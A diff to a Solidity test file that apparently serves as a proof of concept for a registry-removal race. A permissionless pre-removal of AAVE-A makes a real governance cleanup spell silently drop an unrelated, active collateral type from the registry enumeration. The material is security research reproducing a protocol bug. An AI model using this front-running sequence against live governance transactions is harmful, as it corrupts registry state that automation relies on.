@@ -63,10 +63,14 @@ contract IlkRegistryRemovalRaceTest is Test {
     // state one block before execution, after the spell had already been scheduled.
     uint256 internal constant PRE_CAST_BLOCK = 23_118_263;
 
+    // The real spell calls removeAuth 42 times: LSE-MKR-A plus the 41 legacy ilks
+    // enumerated in the "Remove Offboarded ilks" governance section.
+    uint256 internal constant SPELL_REMOVE_AUTH_CALLS = 42;
+
     address internal constant REGISTRY = 0x5a464C28D19848f44199D003BeF5ecc87d090F87;
     address internal constant CLEANUP_SPELL = 0x26009aFf7fE39bF7611d66E0D38CAc43b3A93CD5;
     address internal constant AAVE_JOIN = 0x24e459F61cEAa7b1cE70Dbaea938940A7c5aD46e;
-    address internal constant PAUSE_PROXY = 0xBE8E3e3618f7474F8cB1d074A26affef007E98FB;
+    address internal constant PAUSE_PROXY = 0xBE8E3e3618f7474F8cB1d074A26afFef007E98FB;
 
     bytes32 internal constant AAVE_A = "AAVE-A";
     bytes32 internal constant ETH_A = "ETH-A";
@@ -82,11 +86,12 @@ contract IlkRegistryRemovalRaceTest is Test {
         vat = VatLike(registry.vat());
     }
 
-    function _listed(bytes32 ilk) internal view returns (bool found) {
+    function _listed(bytes32 ilk) internal view returns (bool) {
         bytes32[] memory ilks = registry.list();
         for (uint256 i = 0; i < ilks.length; i++) {
             if (ilks[i] == ilk) return true;
         }
+        return false;
     }
 
     function _castRealCleanupSpell() internal {
@@ -94,10 +99,24 @@ contract IlkRegistryRemovalRaceTest is Test {
         assertTrue(DssSpellLike(CLEANUP_SPELL).done(), "real executive spell did not finish");
     }
 
+    /// @notice Negative control: without an attacker, the historical executive spell
+    /// removes exactly the 42 ilks explicitly encoded in the spell.
+    function testControlRealSpellRemovesOnlyIts42Targets() public {
+        uint256 initialCount = registry.count();
+
+        _castRealCleanupSpell();
+
+        assertEq(
+            registry.count(),
+            initialCount - SPELL_REMOVE_AUTH_CALLS,
+            "clean spell removed an unexpected number of entries"
+        );
+    }
+
     /// @notice A permissionless pre-removal makes the real governance spell remove
     /// an unrelated ilk because removeAuth() accepts a missing key and _remove()
     /// interprets the missing mapping entry's default pos as array index zero.
-    function testRealSpellFrontRunSilentlyRemovesUnrelatedIlk() public {
+    function testRealSpellFrontRunSilentlyRemovesUnrelatedActiveIlk() public {
         assertEq(registry.join(AAVE_A), AAVE_JOIN, "AAVE-A must be registered before the real cleanup spell");
         assertEq(JoinLike(AAVE_JOIN).live(), 0, "AAVE-A join must already be caged");
         assertTrue(registry.class(AAVE_A) == 1 || registry.class(AAVE_A) == 2, "AAVE-A must be publicly removable");
@@ -114,24 +133,35 @@ contract IlkRegistryRemovalRaceTest is Test {
         // This is the unrelated entry that removeAuth(AAVE-A) will silently evict.
         bytes32 unrelated = registry.get(0);
         address unrelatedJoin = registry.join(unrelated);
+        (uint256 unrelatedArt,,, uint256 unrelatedLine,) = vat.ilks(unrelated);
+
         assertTrue(unrelated != AAVE_A, "victim must be unrelated to AAVE-A");
         assertTrue(unrelatedJoin != address(0), "victim must be a real registered ilk");
+        assertTrue(unrelatedArt != 0 || unrelatedLine != 0, "victim must be economically active in Vat");
         assertTrue(_listed(unrelated), "victim must be enumerable before the spell");
 
         // Execute the actual August 7, 2025 executive spell, not a mock call.
         _castRealCleanupSpell();
 
-        // The spell contains 41 removeAuth calls. With the attacker's pre-removal,
-        // the registry loses 42 array entries: the 41 governance targets plus one
-        // unrelated entry consumed by the missing AAVE-A mapping's default pos=0.
-        assertEq(registry.count(), initialCount - 42, "one extra unrelated array entry was not removed");
+        // Clean execution removes 42 targets. The attacker transaction causes one
+        // additional pop when removeAuth(AAVE-A) operates on the now-missing key.
+        assertEq(
+            registry.count(),
+            initialCount - SPELL_REMOVE_AUTH_CALLS - 1,
+            "attack did not cause one extra unrelated removal"
+        );
 
         // Mapping/array invariants are now broken: metadata still says the unrelated
-        // ilk exists at pos 0, while list/get no longer contains it.
+        // ilk exists at pos 0, while list/get no longer contains it. Core Vat state
+        // remains active, so list-based automation silently loses the live collateral.
         assertEq(registry.join(unrelated), unrelatedJoin, "victim metadata was unexpectedly deleted");
         assertEq(registry.pos(unrelated), 0, "victim keeps a stale position");
         assertFalse(_listed(unrelated), "victim was silently removed from enumeration");
-        assertTrue(registry.get(0) != unrelated, "index zero was replaced with another ilk");
+        assertTrue(registry.get(0) != unrelated, "index zero was not replaced");
+
+        (uint256 unrelatedArtAfter,,, uint256 unrelatedLineAfter,) = vat.ilks(unrelated);
+        assertEq(unrelatedArtAfter, unrelatedArt, "attack unexpectedly changed victim Art");
+        assertEq(unrelatedLineAfter, unrelatedLine, "attack unexpectedly changed victim line");
     }
 
     /// @notice Minimal reproduction of the same bug, independent of the historical
@@ -142,9 +172,12 @@ contract IlkRegistryRemovalRaceTest is Test {
 
         bytes32 victim = registry.get(0);
         address victimJoin = registry.join(victim);
+        (uint256 victimArt,,, uint256 victimLine,) = vat.ilks(victim);
         uint256 countBeforeAuthRemoval = registry.count();
 
+        assertTrue(victimArt != 0 || victimLine != 0, "victim must be active");
         assertEq(registry.wards(PAUSE_PROXY), 1, "Pause Proxy must be a registry ward");
+
         vm.prank(PAUSE_PROXY);
         registry.removeAuth(AAVE_A); // AAVE-A is already absent.
 
